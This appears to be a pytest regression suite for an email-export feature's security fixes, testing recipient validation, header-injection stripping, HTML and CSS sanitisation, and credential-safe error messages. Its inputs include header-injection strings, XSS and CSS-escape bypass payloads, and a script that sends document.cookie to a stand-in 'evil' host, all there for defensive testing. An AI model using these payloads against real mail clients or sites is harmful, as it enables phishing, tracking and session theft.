"""Regression tests for the email delivery hardening.

``POST /export/email`` sends mail with the OPERATOR's SMTP identity to an
address and with a body the CALLER chooses. Before this hardening that was a
phishing relay: any account with the export-page entitlement could send
arbitrary HTML (a fake login form, a tracking pixel) to any address.

These tests pin the fixes in ``export/email_delivery.py``:

* the recipient address is validated;
* the subject cannot inject a header;
* the HTML body is sanitised: scripts, frames, forms, event handlers,
  ``javascript:`` URLs and remote images are removed, while report markup
  and embedded (``data:``) charts survive;
* the attachment filename cannot inject a header;
* a failure never leaks the SMTP host, username or password.
"""

from __future__ import annotations

import pytest

from export import email_delivery as ed


class TestRecipientValidation:
    @pytest.mark.parametrize(
        "address",
        ["user@example.com", "first.last+tag@sub.example.co.uk"],
    )
    def test_valid_addresses_pass(self, address):
        assert ed.validate_recipient(address) == address

    @pytest.mark.parametrize(
        "address",
        [
            "",
            "   ",
            "not-an-address",
            "a@b",
            "a@b.c",
            "user@example.com\r\nBcc: victim@example.com",
            "user name@example.com",
            "<user@example.com>",
            "user@example.com, other@example.com",
            "a" * 250 + "@example.com",
        ],
    )
    def test_invalid_addresses_are_refused(self, address):
        with pytest.raises(ValueError):
            ed.validate_recipient(address)

    def test_a_bad_recipient_never_reaches_the_mail_server(self, monkeypatch):
        called = {"n": 0}
        import smtplib

        def _boom(*a, **k):
            called["n"] += 1
            raise AssertionError("the mail server must not be contacted")

        monkeypatch.setattr(ed.smtplib, "SMTP", _boom)
        result = ed.send_report_email(
            "victim@example.com\r\nBcc: x@example.com",
            "Report",
            "<p>hi</p>",
            None,
            {"host": "smtp.example.com", "port": 25},
        )
        assert result["success"] is False
        assert called["n"] == 0
        assert "smtp.example.com" not in result["message"]


class TestSubjectSanitisation:
    def test_newlines_are_removed(self):
        assert "\r" not in ed.sanitize_subject("a\r\nX-Injected: 1")
        assert "\n" not in ed.sanitize_subject("a\nX-Injected: 1")

    def test_length_is_capped(self):
        assert len(ed.sanitize_subject("x" * 500)) <= ed.MAX_SUBJECT_LENGTH


class TestAttachmentName:
    def test_quotes_and_newlines_are_removed(self):
        name = ed.sanitize_attachment_name('re"port\r\nX-Injected: 1.pdf')
        assert '"' not in name
        assert "\r" not in name and "\n" not in name

    def test_a_filename_is_preserved(self):
        assert ed.sanitize_attachment_name("orders.csv") == "orders.csv"


class TestHtmlSanitisation:
    def test_script_tags_are_removed(self):
        out = ed.sanitize_email_html("<p>ok</p><script>alert(1)</script>")
        assert "<script" not in out.lower()
        assert "alert(1)" not in out
        assert "<p>ok</p>" in out

    def test_iframes_are_removed(self):
        out = ed.sanitize_email_html('<iframe src="http://evil"></iframe><p>x</p>')
        assert "iframe" not in out.lower()

    def test_forms_are_removed(self):
        out = ed.sanitize_email_html(
            '<form action="http://evil"><input name="pw"></form><p>x</p>'
        )
        assert "<form" not in out.lower()
        assert "<input" not in out.lower()

    def test_event_handlers_are_removed(self):
        out = ed.sanitize_email_html('<img src="data:image/png;base64,AA" onerror="alert(1)">')
        assert "onerror" not in out.lower()

    def test_javascript_urls_are_removed(self):
        out = ed.sanitize_email_html('<a href="javascript:alert(1)">click</a>')
        assert "javascript:" not in out.lower()

    def test_remote_images_are_removed(self):
        """A remote image is a tracking pixel."""
        out = ed.sanitize_email_html('<img src="http://tracker.example/pixel.gif">')
        assert "tracker.example" not in out

    def test_embedded_images_survive(self):
        """The report charts are embedded as data: images."""
        out = ed.sanitize_email_html('<img src="data:image/png;base64,AAAA">')
        assert "data:image/png;base64,AAAA" in out

    def test_report_markup_survives(self):
        out = ed.sanitize_email_html(
            "<h1>Report</h1><table><tr><td>cell</td></tr></table>"
        )
        assert "<h1>Report</h1>" in out
        assert "<td>cell</td>" in out

    def test_text_is_escaped(self):
        out = ed.sanitize_email_html("<p>a & b</p>")
        assert "&amp;" in out


class TestUrlAttributeBypasses:
    """Every attribute that can carry a URL is a URL attribute.

    A remote image in an email body is a tracking pixel: the mail client
    fetches it and reports the open back to whoever put it there.  That is
    true of every attribute that can name a remote resource, not just
    ``src``.
    """

    def test_a_srcset_pixel_is_removed(self):
        out = ed.sanitize_email_html(
            '<img src="data:image/png;base64,AAAA" '
            'srcset="https://tracker.example/pixel.gif 1x">'
        )
        assert "tracker.example" not in out

    def test_a_srcset_candidate_is_removed(self):
        out = ed.sanitize_email_html(
            '<img src="data:image/png;base64,AAAA" '
            'srcset="https://ok.example/a.png 1x, https://tracker.example/b.png 2x">'
        )
        assert "tracker.example" not in out

    def test_a_source_element_cannot_fetch(self):
        out = ed.sanitize_email_html(
            '<picture><source srcset="https://tracker.example/pixel.gif">'
            '<img src="data:image/png;base64,AAAA"></picture>'
        )
        assert "tracker.example" not in out

    def test_xlink_href_javascript_urls_are_removed(self):
        out = ed.sanitize_email_html(
            '<a xlink:href="javascript:alert(1)">click</a>'
        )
        assert "javascript:" not in out.lower()

    def test_svg_is_removed(self):
        """An SVG carries <script> and event handlers of its own."""
        out = ed.sanitize_email_html(
            '<svg><a xlink:href="javascript:alert(1)"><text>go</text></a></svg>'
        )
        assert "<svg" not in out.lower()
        assert "javascript:" not in out.lower()

    def test_math_is_removed(self):
        out = ed.sanitize_email_html(
            '<math><mtext><a href="javascript:alert(1)">go</a></mtext></math>'
        )
        assert "<math" not in out.lower()
        assert "javascript:" not in out.lower()


class TestCssEscapeBypasses:
    """A CSS escape is decoded by the browser before it parses a value.

    ``u\\72l(`` IS ``url(`` and ``e\\78pression(`` IS ``expression(``, so a
    filter that matches the literal text is defeated by one backslash.
    """

    @staticmethod
    def _decoded(out: str) -> str:
        """Decode the CSS escapes in the output the way a browser would."""
        import re as _re

        def _replace(match):
            if match.group(1):
                try:
                    return chr(int(match.group(1), 16))
                except (ValueError, OverflowError):
                    return ""
            return match.group(2)

        return _re.sub(r"\\([0-9a-fA-F]{1,6})[ \t\n\r\f]?|\\(.)", _replace, out)

    def test_an_escaped_url_call_is_removed(self):
        out = ed.sanitize_email_html(
            '<td style="background:u\\72l(https://tracker.example/x.png)">x</td>'
        )
        assert "tracker.example" not in out
        assert "url(" not in self._decoded(out).lower()

    def test_an_escaped_expression_is_removed(self):
        out = ed.sanitize_email_html(
            '<td style="width:e\\78pression(alert(1))">x</td>'
        )
        assert "expression" not in self._decoded(out).lower()
        assert "alert(" not in out

    def test_a_residual_backslash_drops_the_attribute(self):
        """A CSS line continuation: the browser removes the backslash-newline.

        What the filter reads is not what the browser reads, so a value that
        still contains a backslash after decoding is dropped outright.
        """
        out = ed.sanitize_email_html('<td style="color:red\\\n">x</td>')
        assert "style=" not in out.lower()

    def test_a_plain_style_still_survives(self):
        out = ed.sanitize_email_html(
            '<td style="color:#333333;font-weight:bold">x</td>'
        )
        assert "color" in out
        assert "bold" in out


class TestSendBehaviour:
    def _capture(self, monkeypatch):
        """Intercept the SMTP send and return the captured message."""
        captured = {}

        class _FakeSMTP:
            def __init__(self, host, port, timeout=None):
                captured["host"] = host
                captured["port"] = port

            def __enter__(self):
                return self

            def __exit__(self, *exc):
                return False

            def login(self, user, password):
                captured["login"] = (user, password)

            def send_message(self, msg):
                captured["msg"] = msg

        monkeypatch.setattr(ed.smtplib, "SMTP", _FakeSMTP)
        return captured

    def test_a_hostile_body_is_sanitised_before_sending(self, monkeypatch):
        captured = self._capture(monkeypatch)
        result = ed.send_report_email(
            "user@example.com",
            "Report",
            "<p>hi</p><script>fetch('http://evil/'+document.cookie)</script>",
            None,
            {"host": "smtp.example.com", "port": 25},
        )
        assert result["success"] is True
        payload = captured["msg"].as_string()
        assert "<script" not in payload.lower()
        assert "document.cookie" not in payload

    def test_a_failure_does_not_leak_the_smtp_credentials(self, monkeypatch):
        def _boom(*a, **k):
            raise OSError("connection to smtp.secret.example:587 refused")

        monkeypatch.setattr(ed.smtplib, "SMTP", _boom)
        result = ed.send_report_email(
            "user@example.com",
            "Report",
            "<p>hi</p>",
            None,
            {
                "host": "smtp.secret.example",
                "port": 587,
                "username": "mailer",
                "password": "hunter2",
            },
        )
        assert result["success"] is False
        assert "smtp.secret.example" not in result["message"]
        assert "hunter2" not in result["message"]
        assert "mailer" not in result["message"]

    def test_allow_html_skips_the_sanitiser_for_generated_markup(self, monkeypatch):
        captured = self._capture(monkeypatch)
        result = ed.send_report_email(
            "user@example.com",
            "Report",
            "<p>generated</p>",
            None,
            {"host": "smtp.example.com", "port": 25},
            allow_html=True,
        )
        assert result["success"] is True
        assert "<p>generated</p>" in captured["msg"].as_string()
